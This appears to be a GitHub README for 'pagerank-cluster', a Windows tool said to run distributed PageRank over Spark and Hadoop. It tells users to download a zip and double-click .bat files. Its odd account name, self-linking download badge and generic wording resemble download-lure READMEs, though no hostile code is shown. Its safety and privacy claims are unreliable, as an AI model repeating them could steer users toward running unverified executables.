# 📈 pagerank-cluster - Process massive web graphs using clusters

[![Download pagerank-cluster](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Cortesehardfisted522/pagerank-cluster)

This project allows you to rank web pages using a distributed computing network. It connects multiple computers to process large datasets. You can analyze up to 875,000 web nodes. The system uses a Spark and Hadoop backbone to distribute the workload. 

## 🛠 Prerequisites

Ensure your computers meet these requirements before you start:

- Windows 10 or Windows 11.
- At least 8GB of RAM on each machine.
- A stable local area network connection.
- Java Runtime Environment (JRE) version 11 or higher.
- Python 3.9 or newer.

## 💾 Installation Steps

1. Visit [the official release page](https://github.com/Cortesehardfisted522/pagerank-cluster) to find the latest version.
2. Click the link labeled "pagerank-cluster-windows.zip" to save the file.
3. Open your Downloads folder.
4. Right-click the folder and select Extract All.
5. Choose a location on your hard drive, such as C:\pagerank-cluster.
6. Click Extract.

## ⚙️ Configuration

The system functions across several computers. You must designate one machine as the primary node.

1. Locate the configuration file named "settings.conf" in the extracted folder.
2. Open this file with Notepad.
3. Add the IP addresses of your other computers under the section labeled "worker_nodes".
4. Save the file and close it.

## 🚀 Running the Software

1. Open the folder where you extracted the files.
2. Double-click "start_engine.bat".
3. A terminal window appears. This window displays the status of the cluster.
4. Wait for the message "Server status: Ready" to appear.
5. Open your web browser.
6. Type localhost:5000 into the address bar.
7. The control panel opens in your browser.

## 📊 Using the Dashboard

The dashboard provides a visual interface for your data.

- Dataset Swapping: Click the Browse button to select a new text file containing your web graph. The system supports files in CSV or TXT format.
- Graph Traversal: Enter a starting URL in the search field to trace connections.
- Background Rerun: Toggle this switch to enable automatic updates. The system performs new calculations every hour.

## 🌐 Connecting Multiple Devices

To use more than one laptop:

1. Install the software on every device using the steps above.
2. Copy the "settings.conf" file from your primary machine to all other machines.
3. Ensure every computer stays on the same network.
4. Run "start_worker.bat" on each secondary device.
5. Check your primary dashboard. The count of active nodes updates to reflect the connected computers.

## 🔍 Troubleshooting

- If the dashboard fails to load, verify that Java is installed and updated.
- Check your Windows Firewall settings. Ensure that the application has permission to communicate over private networks.
- If a worker node disconnects, restart the "start_worker.bat" file on that specific machine.
- Large datasets require significant memory. Close other programs if the calculation slows down.

## 📝 Performance Tips

- Use a wired Ethernet connection for the best speed. Wi-Fi connections can introduce latency that slows down the data exchange between nodes.
- Keep your web graph files organized in a dedicated folder.
- Clear the cache if you notice the interface lagging after several hours of operation.

## ℹ️ Technical Details

This software relies on common open-source tools:

- Apache Spark manages the distribution of tasks.
- Hadoop handles the storage of large files across the cluster.
- Flask provides the interface you see in your web browser.
- Python scripts execute the core math behind the rankings.

You do not need to interact with these tools directly. The provided batch files automate the start-up process for you. 

## 🛡 Security and Privacy

Your data stays on your local network. The software does not transmit your web graphs to external servers. All processing happens internally between the laptops you connect. Use this tool within your private network to keep your dataset secure.

## 📋 Frequently Asked Questions

What file format works best?
Plain text files with two columns representing a connection between Page A and Page B work best. The system reads these files directly without complex conversion.

Can I stop the process halfway?
Yes. Close the terminal window to stop all background tasks immediately. Your progress saves automatically to the disk.

How many nodes can I add?
The system supports as many nodes as your network can handle. Most users report stability with clusters of up to ten machines.

Does the system require internet access?
No. Once the software is on your computers, you can disconnect your router from the internet. The cluster functions entirely offline.

What happens if a node fails?
The primary node detects the failure and attempts to redistribute the remaining tasks to healthy machines. The calculation continues, though it may take longer to finish.

## 💡 Future Updates

Check the release page periodically for improvements. New versions aim to speed up calculation times and improve the display of complex graphs. Follow the same installation process to update your current version. Delete the old folder before you extract the new version to avoid configuration conflicts.